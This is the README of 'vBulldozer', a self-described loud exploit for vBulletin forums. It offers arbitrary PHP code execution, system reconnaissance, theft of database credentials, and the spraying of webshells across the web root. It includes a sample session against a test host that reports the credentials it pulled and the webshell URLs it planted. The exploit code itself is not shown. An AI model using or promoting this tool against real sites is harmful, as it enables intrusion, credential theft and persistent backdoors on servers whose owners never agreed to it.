# vBulldozer
Very loud vBulletin exploit, WIP.

Currently gives you a way to execute arbritary PHP code, and does some info-gathering. Deliberately loud as heck. 

It uses a really dumb trick (recursively trying to drop a webshell into every directory) to attempt to guarentee some form of webshell will be obtained.

I mostly wrote that as a joke, its called "equifax mode", as it could lead to you spraying like 30 webshells all over the webroot. 

This is the loudest, most unclean, exploit I think I've written in a while. It has absolutely zero stealth features.

```
$ python vBulldozer.py https://vb.test.local/
{+} Checking https://vb.test.local/
{*} Target is vulnerable!
{+} Proceeding...
{+} Gathering some system information...
{>} PHP uname: Linux vb 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
{>} Current UID: 33
{>} Current Dir: /var/www/html
{+} Gathering database credentials...
{>} Database Host: localhost
{>} Database User: vb
{>} Database Pass: password123
{*} Got 3 paths to try...
{*} Using remote CWD: /var/www/html
{+} Checking https://vb.test.local/includes/vb5/template/bbcode/hax.php
{>} Your shell is at: https://vb.test.local/includes/vb5/template/bbcode/hax.php
{+} Checking https://vb.test.local/includes/vb5/template/cache/hax.php
{>} Your shell is at: https://vb.test.local/includes/vb5/template/cache/hax.php
{+} Checking 
{+} Done!
$
```
